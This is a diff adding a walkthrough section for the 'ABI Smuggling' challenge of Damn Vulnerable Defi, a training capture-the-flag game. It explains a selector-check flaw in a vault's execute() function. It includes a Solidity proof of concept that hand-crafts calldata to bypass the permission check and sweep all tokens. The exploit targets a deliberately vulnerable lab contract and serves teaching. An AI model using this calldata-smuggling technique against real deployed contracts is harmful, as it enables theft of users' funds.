@@ -959,3 +959,43 @@ function test_puppetV3() public checkSolvedByPlayer {
 Run `forge test --mp test/puppet-v3/PuppetV3.t.sol --isolate` to validate test
 
 ---
+
+## 15.ABI SMUGGLING
+
+**Obejctive**
+
+_from `_isSolved()` in test_
+
+1. _All tokens taken from the vault and deposited into the designated recovery account_
+
+**Attack Analysis**
+
+- The vulnerability lies in the `execute()` function, which uses calldataload to extract 4 bytes of the function selector from the provided `actionData` starting at the `calldataOffset` (100 bytes). It then checks whether this ID is authorized using `getActionId()`.
+- The deployer can execute `sweepFunds()` with the selector `0x85fb709d`, and the player can execute `withdraw()` with the selector `0xd9caed12`.
+- The key to the exploit is bypassing the `getActionId()` check, which allows arbitrary execution of `functionCall()`.
+- To craft the payload, an attacker needs to understand that in the ABI encoding of the `execute()` function, `actionData` is a dynamically sized bytes parameter.
+- The value `0x80` is an offset that points to the starting position of the actual data in `actionData`. This offset is calculated relative to the start of the entire calldata.
+
+- **POC**
+
+See [test/abi-smuggling/ABISmuggling.t.sol](https://github.com/CanonicalJP/damn-vulnerable-defi-v4-walkthrough/blob/master/test/abi-smuggling/ABISmuggling.t.sol)
+
+```solidity
+function test_abiSmuggling() public checkSolvedByPlayer {
+    bytes memory calldataPayload = abi.encodePacked(
+        vault.execute.selector, // 4 bytes = Selector
+        abi.encodePacked(bytes12(0), address(vault)), // 32 bytes = vault address padded to 32 bytes
+        abi.encodePacked(uint256(0x80)), // 32 bytes = calldata start location offset
+        abi.encodePacked(uint256(0)), // 32 bytes = empty data filler
+        abi.encodePacked(vault.withdraw.selector, bytes28(0)), // 32 bytes = ´withdraw()´ selector
+        abi.encodePacked(uint256(0x44)), // 32 bytes = Length of actionData
+        abi.encodeWithSelector(vault.sweepFunds.selector, recovery, token) // The actual calldata to `sweepFunds()`
+    );
+
+    address(vault).call(calldataPayload);
+}
+```
+
+Run `forge test --mp test/abi-smuggling/ABISmuggling.t.sol --isolate` to validate test
+
+---
